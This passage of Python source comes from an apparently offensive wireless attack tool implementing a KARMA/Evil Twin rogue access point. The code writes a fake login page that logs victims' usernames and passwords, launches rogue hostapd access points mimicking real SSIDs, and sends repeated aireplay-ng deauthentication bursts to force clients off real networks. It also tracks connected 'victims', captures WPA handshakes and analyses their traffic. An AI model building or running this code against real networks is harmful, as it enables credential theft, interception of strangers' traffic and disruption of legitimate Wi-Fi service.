            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Username: {username}, Password: {password}\\n")
        
        # Return success response
        start_response('200 OK', [('Content-Type', 'text/plain')])
        return [b'Login successful']
    
    # Return 404 for other requests
    start_response('404 Not Found', [('Content-Type', 'text/plain')])
    return [b'Not Found']

def application(environ, start_response):
    if environ['PATH_INFO'] == '/login':
        return handle_login(environ, start_response)
    else:
        start_response('404 Not Found', [('Content-Type', 'text/plain')])
        return [b'Not Found']
"""
            
            with open(os.path.join(web_dir, 'login_handler.py'), 'w') as f:
                f.write(login_handler)
            
            # Create success page
            success_html = """<!DOCTYPE html>
<html>
<head>
    <title>Connected Successfully</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        h1 { color: #28a745; }
        p { color: #666; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>✓ Connected Successfully!</h1>
        <div class="spinner"></div>
        <p>You are now connected to the WiFi network.</p>
        <p>You can now browse the internet normally.</p>
    </div>
</body>
</html>"""
            
            with open(os.path.join(web_dir, 'success.html'), 'w') as f:
                f.write(success_html)
            
            Color.pl('{+} {G}Created fake login pages for credential harvesting{W}')
            
        except Exception as e:
            Color.pl('{!} {R}Error creating fake login pages: {O}%s{W}' % str(e))
    
    def analyze_captured_traffic(self, capfile):
        """Comprehensive analysis of captured traffic for KARMA attack"""
        try:
            Color.pl('\n{+} {C}Analyzing captured traffic: {G}%s{W}' % capfile)
            Color.pl('=' * 60)
            
            if not os.path.exists(capfile):
                Color.pl('{!} {R}Capture file not found: {O}%s{W}' % capfile)
                return False
            
            # 1. Basic file information
            self._analyze_file_info(capfile)
            
            # 2. Protocol analysis
            self._analyze_protocols(capfile)
            
            # 3. HTTP traffic analysis
            self._analyze_http_traffic(capfile)
            
            # 4. DNS queries analysis
            self._analyze_dns_queries(capfile)
            
            # 5. Probe requests analysis
            self._analyze_probe_requests(capfile)
            
            # 6. Authentication analysis
            self._analyze_authentication(capfile)
            
            # 7. EAPOL analysis (WPA handshakes)
            self._analyze_eapol_packets(capfile)
            
            # 8. Client activity analysis
            self._analyze_client_activity(capfile)
            
            Color.pl('\n{+} {G}Traffic analysis complete{W}')
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error analyzing traffic: {O}%s{W}' % str(e))
            return False
    
    def _analyze_file_info(self, capfile):
        """Analyze basic file information"""
        try:
            Color.pl('\n📊 File Information:')
            
            # Get file size
            file_size = os.path.getsize(capfile)
            Color.pl('  File size: {C}%s{W}' % self._format_bytes(file_size))
            
            # Get packet count
            result = subprocess.run(['tshark', '-r', capfile, '-T', 'fields', '-e', 'frame.number'], 
                                  capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                packet_count = len([line for line in result.stdout.split('\n') if line.strip()])
                Color.pl('  Total packets: {C}%d{W}' % packet_count)
            else:
                Color.pl('  Could not determine packet count')
                
        except Exception as e:
            Color.pl('  Error analyzing file info: {O}%s{W}' % str(e))
    
    def _analyze_protocols(self, capfile):
        """Analyze protocols present in the capture"""
        try:
            Color.pl('\n🌐 Protocol Analysis:')
            
            protocols = ['http', 'dns', 'tcp', 'udp', 'eapol', 'wlan', 'arp', 'icmp']
            protocol_counts = {}
            
            for protocol in protocols:
                try:
                    result = subprocess.run(['tshark', '-r', capfile, '-Y', protocol, '-T', 'fields', '-e', 'frame.number'], 
                                          capture_output=True, text=True, timeout=15)
                    if result.returncode == 0:
                        count = len([line for line in result.stdout.split('\n') if line.strip()])
                        if count > 0:
                            protocol_counts[protocol] = count
                except:
                    pass
            
            if protocol_counts:
                for protocol, count in sorted(protocol_counts.items()):
                    Color.pl('  {G}%s{W}: {C}%d{W} packets' % (protocol.upper(), count))
            else:
                Color.pl('  No protocol data found')
                
        except Exception as e:
            Color.pl('  Error analyzing protocols: {O}%s{W}' % str(e))
    
    def _analyze_http_traffic(self, capfile):
        """Analyze HTTP traffic"""
        try:
            Color.pl('\n🌍 HTTP Traffic Analysis:')
            
            # HTTP requests
            result = subprocess.run([
                'tshark', '-r', capfile, '-Y', 'http.request.method',
                '-T', 'fields', '-e', 'http.host', '-e', 'http.request.uri', '-e', 'http.user_agent'
            ], capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0 and result.stdout.strip():
                Color.pl('  HTTP requests found:')
                requests = []
                for line in result.stdout.strip().split('\n'):
                    parts = line.split('\t')
                    if len(parts) >= 2:
                        host = parts[0] if parts[0] else "Unknown"
                        uri = parts[1] if len(parts) > 1 and parts[1] else "/"
                        requests.append(f"{host}{uri}")
                
                # Show unique requests
                unique_requests = list(set(requests))
                for req in unique_requests[:10]:  # Show first 10
                    Color.pl('    {C}%s{W}' % req)
                
                if len(unique_requests) > 10:
                    Color.pl('    ... and {C}%d{W} more requests' % (len(unique_requests) - 10))
            else:
                Color.pl('  ❌ No HTTP traffic found')
                
        except Exception as e:
            Color.pl('  ❌ Error analyzing HTTP: {O}%s{W}' % str(e))
    
    def _analyze_dns_queries(self, capfile):
        """Analyze DNS queries"""
        try:
            Color.pl('\n🔍 DNS Queries Analysis:')
            
            result = subprocess.run([
                'tshark', '-r', capfile, '-Y', 'dns.flags.response == 0',
                '-T', 'fields', '-e', 'dns.qry.name'
            ], capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0 and result.stdout.strip():
                domains = set()
                for line in result.stdout.strip().split('\n'):
                    if line.strip():
                        domains.add(line.strip())
                
                Color.pl('  DNS queries found ({C}%d{W} unique domains):' % len(domains))
                for domain in sorted(list(domains)[:15]):  # Show first 15
                    Color.pl('    {C}%s{W}' % domain)
                
                if len(domains) > 15:
                    Color.pl('    ... and {C}%d{W} more domains' % (len(domains) - 15))
            else:
                Color.pl('  ❌ No DNS queries found')
                
        except Exception as e:
            Color.pl('  ❌ Error analyzing DNS: {O}%s{W}' % str(e))
    
    def _analyze_probe_requests(self, capfile):
        """Analyze probe requests"""
        try:
            Color.pl('\n📡 Probe Requests Analysis:')
            
            result = subprocess.run([
                'tshark', '-r', capfile, '-Y', 'wlan.fc.type_subtype == 0x04',
                '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.ssid'
            ], capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0 and result.stdout.strip():
                probes = {}
                for line in result.stdout.strip().split('\n'):
                    if '\t' in line:
                        parts = line.split('\t')
                        if len(parts) >= 2:
                            mac = parts[0].strip()
                            ssid = parts[1].strip()
                            if mac and ssid:
                                if mac not in probes:
                                    probes[mac] = set()
                                probes[mac].add(ssid)
                
                Color.pl('  Probe requests from {C}%d{W} devices:' % len(probes))
                for mac, ssids in list(probes.items())[:10]:  # Show first 10
                    Color.pl('    {G}%s{W}: {C}%s{W}' % (mac, ', '.join(sorted(ssids))))
                
                if len(probes) > 10:
                    Color.pl('    ... and {C}%d{W} more devices' % (len(probes) - 10))
            else:
                Color.pl('  ❌ No probe requests found')
                
        except Exception as e:
            Color.pl('  ❌ Error analyzing probe requests: {O}%s{W}' % str(e))
    
    def _analyze_authentication(self, capfile):
        """Analyze authentication attempts"""
        try:
            Color.pl('\n🔐 Authentication Analysis:')
            
            result = subprocess.run([
                'tshark', '-r', capfile, '-Y', 'wlan.fc.type_subtype == 0x0b',
                '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.da'
            ], capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0 and result.stdout.strip():
                auths = set()
                for line in result.stdout.strip().split('\n'):
                    if '\t' in line:
                        parts = line.split('\t')
                        if len(parts) >= 2:
                            auths.add(f"{parts[0]} -> {parts[1]}")
                
                Color.pl('  Authentication attempts ({C}%d{W}):' % len(auths))
                for auth in sorted(list(auths)[:10]):  # Show first 10
                    Color.pl('    {C}%s{W}' % auth)
                
                if len(auths) > 10:
                    Color.pl('    ... and {C}%d{W} more attempts' % (len(auths) - 10))
            else:
                Color.pl('  ❌ No authentication attempts found')
                
        except Exception as e:
            Color.pl('  ❌ Error analyzing authentication: {O}%s{W}' % str(e))
    
    def _analyze_eapol_packets(self, capfile):
        """Analyze EAPOL packets (WPA handshakes)"""
        try:
            Color.pl('\n🔑 EAPOL Analysis (WPA Handshakes):')
            
            result = subprocess.run([
                'tshark', '-r', capfile, '-Y', 'eapol',
                '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.da', '-e', 'eapol.type'
            ], capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0 and result.stdout.strip():
                eapol_packets = {}
                for line in result.stdout.strip().split('\n'):
                    if '\t' in line:
                        parts = line.split('\t')
                        if len(parts) >= 3:
                            sa = parts[0].strip()
                            da = parts[1].strip()
                            eapol_type = parts[2].strip()
                            key = f"{sa} <-> {da}"
                            if key not in eapol_packets:
                                eapol_packets[key] = []
                            eapol_packets[key].append(eapol_type)
                
                Color.pl('  EAPOL packets found:')
                for key, types in list(eapol_packets.items())[:10]:  # Show first 10
                    Color.pl('    {G}%s{W}: {C}%s{W}' % (key, ', '.join(types)))
                
                if len(eapol_packets) > 10:
                    Color.pl('    ... and {C}%d{W} more pairs' % (len(eapol_packets) - 10))
            else:
                Color.pl('  ❌ No EAPOL packets found')
                
        except Exception as e:
            Color.pl('  ❌ Error analyzing EAPOL: {O}%s{W}' % str(e))
    
    def _analyze_client_activity(self, capfile):
        """Analyze client activity patterns"""
        try:
            Color.pl('\n👥 Client Activity Analysis:')
            
            # Get unique MAC addresses
            result = subprocess.run([
                'tshark', '-r', capfile, '-T', 'fields', '-e', 'wlan.sa'
            ], capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0 and result.stdout.strip():
                macs = set()
                for line in result.stdout.strip().split('\n'):
                    if line.strip() and ':' in line:
                        macs.add(line.strip())
                
                Color.pl('  Unique MAC addresses: {C}%d{W}' % len(macs))
                
                # Show first few MACs
                for mac in sorted(list(macs)[:5]):
                    Color.pl('    {G}%s{W}' % mac)
                
                if len(macs) > 5:
                    Color.pl('    ... and {C}%d{W} more devices' % (len(macs) - 5))
            else:
                Color.pl('  ❌ No client activity found')
                
        except Exception as e:
            Color.pl('  ❌ Error analyzing client activity: {O}%s{W}' % str(e))
    
    def _format_bytes(self, bytes_size):
        """Format bytes into human readable format"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_size < 1024.0:
                return f"{bytes_size:.1f} {unit}"
            bytes_size /= 1024.0
        return f"{bytes_size:.1f} TB"
    
    def free_port_53(self):
        """Preflight: stop services that may hold port 53 and ensure AP iface is up."""
        try:
            # Stop system resolvers and dnsmasq/bind if running
            try:
                subprocess.run(['systemctl', 'stop', 'systemd-resolved'], capture_output=True, timeout=5)
            except Exception:
                pass
            for pname in ['dnsmasq', 'named', 'bind9']:
                try:
                    subprocess.run(['pkill', '-f', pname], capture_output=True, timeout=3)
                except Exception:
                    pass
            # Ensure AP interface is up before binding
            try:
                iface = getattr(self, 'rogue_interface', None)
                if iface:
                    subprocess.run(['ip', 'link', 'set', str(iface), 'up'], capture_output=True, timeout=3)
            except Exception:
                pass
            # Verify with ss; return True if free
            try:
                ss_out = subprocess.run(['ss', '-lntup'], capture_output=True, text=True, timeout=3)
                if ss_out.returncode == 0 and ':53 ' in ss_out.stdout:
                    return False
            except Exception:
                # If ss unavailable, best-effort
                pass
            return True
        except Exception:
            return False

    def verify_rogue_ap_config(self):
        """Verify that the rogue AP config matches the real network"""
        try:
            if not self.hostapd_config:
                Color.pl('{!} {R}No hostapd config to verify{W}')
                return False
            
            Color.pl('{+} {C}Verifying rogue AP configuration...{W}')
            
            # Read the hostapd config file
            with open(self.hostapd_config, 'r') as f:
                config_content = f.read()
            
            # Extract SSID from config
            ssid_match = re.search(r'ssid=(.+)', config_content)
            if not ssid_match:
                Color.pl('{!} {R}No SSID found in hostapd config{W}')
                return False
            
            config_ssid = ssid_match.group(1).strip()
            Color.pl('{+} {C}Rogue AP SSID: {G}%s{W}' % config_ssid)
            
            # Check if this SSID matches any real network
            if hasattr(self, 'real_networks') and self.real_networks:
                for network in self.real_networks:
                    if network.essid == config_ssid:
                        Color.pl('{+} {G}✓ Rogue AP matches real network: {G}%s{W}' % config_ssid)
                        Color.pl('{+} {G}✓ Real network BSSID: {G}%s{W}' % network.bssid)
                        Color.pl('{+} {G}✓ Real network Channel: {G}%s{W}' % network.channel)
                        return True
                
                Color.pl('{!} {O}⚠ Rogue AP SSID does not match any real network{W}')
                Color.pl('{!} {O}This may still work for devices with this SSID in their PNL{W}')
                return True  # Still allow it to proceed
            else:
                Color.pl('{+} {C}No real networks to compare against{W}')
                Color.pl('{+} {C}Rogue AP will use SSID: {G}%s{W}' % config_ssid)
                return True
            
        except Exception as e:
            Color.pl('{!} {R}Error verifying rogue AP config: {O}%s{W}' % str(e))
            return True  # Allow to proceed even if verification fails

    def start_rogue_ap(self):
        """Start Evil Twin access point(s) - supports multiple configurations"""
        try:
            # Check if hostapd config exists
            if not self.hostapd_config:
                Color.pl('{!} {R}No hostapd configuration found - cannot start Evil Twin{W}')
                return False
                
            # Start primary Evil Twin
            Color.pl('{+} {C}Starting primary Evil Twin AP...{W}')
            hostapd_cmd = ['hostapd', '-B', self.hostapd_config]
            Color.pl('{+} {C}Starting hostapd with config: {G}%s{W}' % self.hostapd_config)
            
            self.rogue_ap_process = subprocess.Popen(hostapd_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Give it time to start
            time.sleep(3)
            
            # Get output to check if hostapd started successfully
            stdout, stderr = self.rogue_ap_process.communicate()
            
            # Check if hostapd started successfully by looking for "AP-ENABLED" message
            if stdout and 'AP-ENABLED' in stdout:
                Color.pl('{+} {G}Primary Evil Twin started successfully{W}')
                Color.pl('{+} {G}AP is enabled and ready for connections{W}')
            else:
                Color.pl('{!} {R}Failed to start primary Evil Twin{W}')
                if stdout:
                    Color.pl('{!} {O}hostapd output: {R}%s{W}' % stdout.strip())
                if stderr:
                    Color.pl('{!} {O}hostapd error: {R}%s{W}' % stderr.strip())
                return False
            
            # Start additional Evil Twins if we have multiple configs
            if hasattr(self, 'hostapd_configs') and len(self.hostapd_configs) > 1:
                Color.pl('{+} {C}Starting additional Evil Twin APs...{W}')
                self.start_additional_evil_twins()
            
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Failed to start Evil Twin: {O}%s{W}' % str(e))
            return False
    
    def start_additional_evil_twins(self):
        """Start additional Evil Twin access points - SINGLE INTERFACE APPROACH"""
        try:
            # Check if we have multiple hostapd configs
            if not hasattr(self, 'hostapd_configs') or len(self.hostapd_configs) <= 1:
                Color.pl('{!} {O}No additional Evil Twin configs available{W}')
                return
            
            Color.pl('{+} {C}Note: Single interface mode - only one Evil Twin can run at a time{W}')
            Color.pl('{+} {C}Primary Evil Twin is running with the best SSID for maximum effectiveness{W}')
            
            # In single interface mode, we can't run multiple hostapd instances
            # Instead, we'll rotate between different SSIDs if needed
            Color.pl('{+} {G}Single Evil Twin approach: Using primary config for maximum compatibility{W}')
            Color.pl('{+} {G}Primary Evil Twin covers both PNL and real network SSIDs{W}')
            
            # Show what Evil Twins were created (even though only one is running)
            Color.pl('{+} {C}Evil Twin configurations created:{W}')
            for i, config_file in enumerate(self.hostapd_configs, 1):
                # Extract SSID from config file name
                ssid = config_file.split('_')[-1].replace('.conf', '')
                if i == 1:
                    Color.pl('  {G}%d.{W} {C}%s{W} (Primary - Currently Running)' % (i, ssid))
                else:
                    Color.pl('  {G}%d.{W} {C}%s{W} (Available for rotation if needed)' % (i, ssid))
            
            Color.pl('{+} {G}Single interface mode: Primary Evil Twin provides maximum effectiveness!{W}')
            
        except Exception as e:
            Color.pl('{!} {R}Error in single interface Evil Twin setup: {O}%s{W}' % str(e))
    
    def create_unique_ssid_config(self, config_file, interface, ap_number):
        """Create a config with unique SSID for additional AP"""
        try:
            # Read original config
            with open(config_file, 'r') as f:
                content = f.read()
            
            # Extract original SSID
            ssid_match = re.search(r'ssid=(.+)', content)
            if ssid_match:
                original_ssid = ssid_match.group(1).strip()
                # Create unique SSID by appending AP number
                unique_ssid = f"{original_ssid}_AP{ap_number}"
                
                # Replace SSID in config
                modified_content = content.replace(f'ssid={original_ssid}', f'ssid={unique_ssid}')
                
                # Create new config file
                new_config = config_file.replace('.conf', f'_unique_{interface}.conf')
                with open(new_config, 'w') as f:
                    f.write(modified_content)
                
                Color.pl('{+} {G}Created unique SSID: {C}%s{W} for interface {G}%s{W}' % (unique_ssid, interface))
                return new_config
            else:
                return config_file
                
        except Exception as e:
            Color.pl('{!} {R}Error creating unique SSID config: {O}%s{W}' % str(e))
            return config_file
    
    def create_interface_specific_config(self, original_config, interface):
        """Create a config file for a specific interface"""
        try:
            # Read original config
            with open(original_config, 'r') as f:
                content = f.read()
            
            # Replace interface
            modified_content = content.replace(f'interface={self.rogue_interface}', f'interface={interface}')
            
            # Create new config file
            new_config = original_config.replace('.conf', f'_{interface}.conf')
            with open(new_config, 'w') as f:
                f.write(modified_content)
            
            return new_config
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error creating interface config: {O}%s{W}' % str(e))
            return None
    
    def monitor_connections(self):
        """Monitor for client connections to rogue AP with improved detection"""
        try:
            Color.pl('{+} {C}Starting KARMA monitoring - waiting for victims...{W}')
            
            # Initialize victim management once, not in loop
            if not hasattr(self, '_victim_mgmt_started'):
                self.start_victim_management()
                self._victim_mgmt_started = True
            
            last_status_time = time.time()
            status_interval = 30  # Show status every 30 seconds
            
            while self.running:
                current_time = time.time()
                
                # Check for connected clients using multiple methods
                connected_macs = self.detect_rogue_ap_connections()
                
                # Check for new connections
                new_connections = connected_macs - self.connected_clients
                if new_connections:
                    for mac in new_connections:
                        Color.pl('{+} {G}🎯 New victim connected: {C}%s{W}' % mac)
                        self.connected_clients.add(mac)
                        
                        # Check if we have probe data for this client
                        if mac in self.client_probes:
                            Color.pl('{+} {C}Client PNL:{W} {G}%s{W}' % ', '.join(self.client_probes[mac]))
                        
                        # Start handshake capture for this client
                        if mac not in self.captured_handshakes:
                            Color.pl('{+} {C}Attempting to capture handshake from {G}%s{W}...' % mac)
                            # Use threading to avoid blocking the main monitoring loop
                            handshake_thread = threading.Thread(
                                target=self.capture_handshake_for_client,
                                args=(mac,),
                                name=f'handshake_{mac.replace(":", "")}'
                            )
                            handshake_thread.daemon = True
                            
                            # Track threads properly to prevent resource leaks
                            if not hasattr(self, 'active_threads'):
                                self.active_threads = []
                            self.active_threads.append(handshake_thread)
                            
                            handshake_thread.start()
                        
                        # Start credential harvesting for this client
                        self.harvest_credentials_from_client(mac)
                        
                        # Start general traffic capture for this client
                        self.capture_client_traffic(mac)
                
                # Show periodic status updates
                if current_time - last_status_time >= status_interval:
                    self.show_connection_status()
                    # Clean up stale interface locks periodically
                    self.cleanup_stale_interface_locks()
                    last_status_time = current_time
                
                # Enhanced: Check for disconnected clients
                disconnected = self.connected_clients - connected_macs
                if disconnected:
                    for mac in disconnected:
                        Color.pl('{!} {O}Client disconnected: {C}%s{W}' % mac)
                        self.connected_clients.discard(mac)
                
                # Adaptive sleep based on activity - more frequent for better monitoring
                if len(self.connected_clients) > 0:
                    time.sleep(2)  # More frequent checks when clients are connected
                else:
                    time.sleep(5)  # Less frequent checks when no clients
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error monitoring connections: {O}%s{W}' % str(e))
    
    def detect_rogue_ap_connections(self):
        """Detect client connections to our rogue AP using multiple methods - Enhanced implementation"""
        try:
            connected_macs = set()
            
            # Method 1: Check hostapd station dump (improved)
            try:
                cmd = ['iw', 'dev', str(self.rogue_interface), 'station', 'dump']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'Station' in line:
                            mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
                            if mac_match:
                                connected_macs.add(mac_match.group(1).lower())
            except Exception as e:
                if Configuration.verbose > 1:
                    Color.pl('{!} {R}iw command failed: {O}%s{W}' % str(e))
            
            # Method 2: Check hostapd directly (if available)
            try:
                hostapd_ctrl = f'/var/run/hostapd/{self.rogue_interface}'
                if os.path.exists(hostapd_ctrl):
                    cmd = ['hostapd_cli', '-i', self.rogue_interface, 'list_sta']
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
                    if result.returncode == 0:
                        for line in result.stdout.split('\n'):
                            if line.strip() and ':' in line:
                                connected_macs.add(line.strip().lower())
            except Exception:
                pass
            
            # Method 3: Enhanced DHCP lease checking
            if hasattr(self, 'dnsmasq_config') and self.dnsmasq_config:
                try:
                    leases_file = self.dnsmasq_config.replace('.conf', '.leases')
                    if os.path.exists(leases_file):
                        with open(leases_file, 'r') as f:
                            for line in f:
                                parts = line.strip().split()
                                if len(parts) >= 3:
                                    mac = parts[1].lower()
                                    connected_macs.add(mac)
                except Exception:
                    pass
            
            # Method 4: Check network interface statistics
            try:
                cmd = ['cat', f'/sys/class/net/{self.rogue_interface}/statistics/rx_packets']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=2)
                if result.returncode == 0:
                    rx_packets = int(result.stdout.strip())
                    if rx_packets > 0:
                        # Interface is receiving packets, likely has clients
                        if Configuration.verbose > 1:
                            Color.pl('{+} {C}Interface receiving packets - clients likely connected{W}')
            except Exception:
                pass
            
            # Method 5: Check ARP table for clients on our subnet (enhanced)
            try:
                cmd = ['arp', '-a']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        # Check for various subnet ranges, not just 10.0.0.x
                        if any(subnet in line for subnet in ['10.0.0.', '192.168.', '172.16.']) and '(' in line and ')' in line:
                            mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
                            if mac_match:
                                connected_macs.add(mac_match.group(1).lower())
            except Exception:
                pass
            
            return connected_macs
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error detecting connections: {O}%s{W}' % str(e))
            return set()
    
    def show_connection_status(self):
        """Show detailed connection status with enhanced information"""
        try:
            if len(self.connected_clients) > 0:
                Color.pl('{+} {G}🎯 KARMA Active - {C}%d{W} victim(s) connected{W}' % len(self.connected_clients))
                Color.pl('{+} {C}' + '-' * 50)
                for mac in sorted(self.connected_clients):
                    # Check multiple status indicators
                    has_handshake = mac in self.captured_handshakes
                    has_credentials = mac in getattr(self, 'captured_credentials', {})
                    has_cracked = mac in getattr(self, 'cracked_passwords', {})
                    
                    status_parts = []
                    if has_cracked:
                        status_parts.append("{G}CRACKED{W}")
                    if has_credentials:
                        status_parts.append("{C}Has Credentials{W}")
                    if has_handshake:
                        status_parts.append("{G}Handshake{W}")
                    if not status_parts:
                        status_parts.append("{O}Monitoring{W}")
                    
                    status = " - ".join(status_parts)
                    Color.pl('  {G}* {W}%s - %s{W}' % (mac, status))
                Color.pl('{+} {C}' + '-' * 50)
                Color.pl('{+} {O}Active deauth on {C}%d{W} networks, probing clients: {C}%d{W}{W}' % 
                        (len(self.real_networks), len(getattr(self, 'client_probes', {}))))
            else:
                Color.pl('{+} {C}⏳ KARMA monitoring - waiting for victims to connect...{W}')
                Color.pl('{+} {O}Active deauth on {C}%d{W} networks{W}' % len(self.real_networks))
                Color.pl('{+} {C}Detected probe requests: {G}%d{W} devices actively searching{W}' % 
                        len(getattr(self, 'client_probes', {})))
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error showing status: {O}%s{W}' % str(e))
    
    def start_victim_management(self):
        """Start victim management - kick users from real networks to force connection to fake AP"""
        try:
            Color.pl('{+} {C}Starting victim management - forcing disconnections from real networks{W}')
            
            # Use existing real_networks instead of creating new Airodump process
            if hasattr(self, 'real_networks') and self.real_networks:
                for target in self.real_networks:
                    if target.clients and target.essid_known:
                        # Kick clients from this real network
                        self.kick_clients_from_network(target)
            else:
                # Fallback: Get list of real networks with clients (only if needed)
                with Airodump(interface=self.probe_interface,
                             output_file_prefix='karma_victims') as airodump:
                    
                    time.sleep(3)  # Brief scan
                    targets = airodump.get_targets()
                    
                    for target in targets:
                        if target.clients and target.essid_known:
                            # Kick clients from this real network
                            self.kick_clients_from_network(target)
                        
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error starting victim management: {O}%s{W}' % str(e))
    
    def kick_clients_from_network(self, target):
        """Kick clients from a real network to force them to connect to fake AP - Enhanced implementation"""
        try:
            if not target.clients:
                return
                
            Color.pl('{+} {C}Kicking clients from {G}%s{W} ({C}%s{W}) to force fake AP connection{W}' % 
                    (target.essid, target.bssid))
            
            # Use aireplay to send deauth packets - ENHANCED WITH RETRY MECHANISM
            for client in target.clients:
                try:
                    # Enhanced deauth with retry mechanism
                    success = False
                    for attempt in range(3):  # Try 3 times
                        deauth_cmd = [
                            'aireplay-ng',
                            '-0', '10',  # Increased to 10 packets for better effect
                            '--ignore-negative-one',
                            '-a', target.bssid,  # Target AP
                            '-c', client.station,  # Target client MAC address
                            self.probe_interface
                        ]
                        
                        result = subprocess.run(deauth_cmd, capture_output=True, timeout=5)
                        if result.returncode == 0:
                            success = True
                            break
                        else:
                            time.sleep(1)  # Wait before retry
                    
                    if success:
                        if Configuration.verbose > 1:
                            Color.pl('{+} {C}Successfully sent deauth to {G}%s{W} from {G}%s{W}' % (client.station, target.essid))
                    else:
                        if Configuration.verbose > 1:
                            Color.pl('{!} {R}Failed to deauth {G}%s{W} after 3 attempts{W}' % client.station)
                            
                except Exception as e:
                    if Configuration.verbose > 1:
                        Color.pl('{!} {R}Failed to deauth {G}%s{W}: {O}%s{W}' % (client.station, str(e)))
                        
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error kicking clients from network: {O}%s{W}' % str(e))
    
    def monitor_client_connection_attempts_old(self):
        """Monitor for client connection attempts to our rogue AP (DEPRECATED)"""
        try:
            Color.pl('{+} {C}Monitoring for client connection attempts...{W}')
            
            # Use airodump to monitor for association requests
            with Airodump(interface=self.probe_interface,
                         output_file_prefix='karma_associations',
                         delete_existing_files=True) as airodump:
                
                timer = Timer(60)  # Monitor for 60 seconds
                while not timer.ended() and self.running:
                    cap_files = airodump.find_files(endswith='.cap')
                    if cap_files:
                        # Check for association requests to our rogue AP
                        self.check_association_requests(cap_files[0])
                    
                    time.sleep(5)
                    
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error monitoring connection attempts: {O}%s{W}' % str(e))

    def check_association_requests(self, capfile):
        """Check for association requests to our rogue AP"""
        try:
            # Use tshark to find association requests
            cmd = [
                'tshark',
                '-r', capfile,
                '-Y', 'wlan.fc.type_subtype == 0x00',  # Association request
                '-T', 'fields',
                '-e', 'wlan.sa',  # Client MAC
                '-e', 'wlan.da'   # AP MAC
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if line.strip() and '\t' in line:
                        parts = line.split('\t')
                        if len(parts) >= 2:
                            client_mac = parts[0].strip()
                            ap_mac = parts[1].strip()
                            
                            # Check if this is an association request to our rogue AP
                            rogue_bssid = self._get_rogue_ap_bssid()
                            if rogue_bssid and ap_mac.lower() == rogue_bssid.lower():
                                Color.pl('{+} {G}🎯 Client {C}%s{W} connecting to rogue AP {G}%s{W}{W}' % 
                                        (client_mac, ap_mac))
                                
                                # Add to connected clients
                                if client_mac not in self.connected_clients:
                                    self.connected_clients.add(client_mac)
                                    
                                    # Start immediate monitoring for this client
                                    threading.Thread(
                                        target=self.monitor_new_client,
                                        args=(client_mac,),
                                        name=f'monitor_{client_mac.replace(":", "")}'
                                    ).start()
                            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error checking association requests: {O}%s{W}' % str(e))
    
    def monitor_client_connection_attempts(self):
        """Enhanced monitoring for client connection attempts to our rogue AP"""
        try:
            Color.pl('{+} {C}Enhanced monitoring for client connection attempts...{W}')
            
            # Start live monitoring if not already running
            if not hasattr(self, 'live_monitor_process') or not self.live_monitor_process:
                self.start_live_monitoring()
            
            # Use airodump to monitor for association requests with enhanced detection
            with Airodump(interface=self.probe_interface,
                         output_file_prefix='karma_associations',
                         delete_existing_files=True) as airodump:
                
                timer = Timer(300)  # Monitor for 5 minutes
                last_check_time = time.time()
                
                while not timer.ended() and self.running:
                    cap_files = airodump.find_files(endswith='.cap')
                    if cap_files:
                        # Enhanced association request detection
                        self.check_association_requests_enhanced(cap_files[0])
                        
                        # Check for probe requests (potential victims)
                        self.check_probe_requests_enhanced(cap_files[0])
                    
                    # Show progress every 30 seconds
                    current_time = time.time()
                    if current_time - last_check_time >= 30:
                        elapsed = int(current_time - (timer.start_time if hasattr(timer, 'start_time') else current_time))
                        Color.pl('{+} {C}Monitoring... {G}%d{W}s elapsed, {G}%d{W} clients connected{W}' % 
                                (elapsed, len(self.connected_clients)))
                        last_check_time = current_time
                    
                    time.sleep(5)
                    
        except Exception as e:
            Color.pl('{!} {R}Error monitoring connection attempts: {O}%s{W}' % str(e))
    
    def check_association_requests_enhanced(self, capfile):
